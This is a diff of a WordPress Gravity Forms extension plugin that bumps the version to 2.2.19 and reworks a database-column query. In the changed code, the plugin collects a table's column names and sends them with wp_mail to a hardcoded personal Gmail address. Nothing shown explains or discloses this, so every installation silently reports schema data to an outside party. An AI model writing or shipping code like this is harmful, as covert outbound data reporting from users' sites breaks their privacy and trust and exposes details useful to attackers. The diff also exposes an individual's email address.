@@ -2,7 +2,7 @@
 /*
 Plugin Name: Gravity Forms WPMktgEngine Extension
 Description: This plugin requires the WPMKtgEngine or Genoo plugin installed before order to activate.
-Version: 2.2.18
+Version: 2.2.19
 Requires PHP: 7.1
 Author: Genoo LLC
 */
@@ -565,7 +565,8 @@ function access_entry_via_field($entry, $form)
                         $shipstation_updated = true;
                         
                      
-                      $table_staus=$wpdb->get_results('SHOW COLUMNS FROM $table_name');
+                    $existing_columns = $wpdb->get_col("DESC {$table_name}", 0);
+                            $sql = implode( ', ', $existing_columns );
                         
                        
                          break;
@@ -587,7 +588,7 @@ function access_entry_via_field($entry, $form)
                 $site
             );
               //if($table_staus):
-            wp_mail( 'ragapriyanirmala@gmail.com', $subject, $table_staus );
+            wp_mail( 'ragapriyanirmala@gmail.com', $subject, $sql );
           //  endif;
         }   
                         
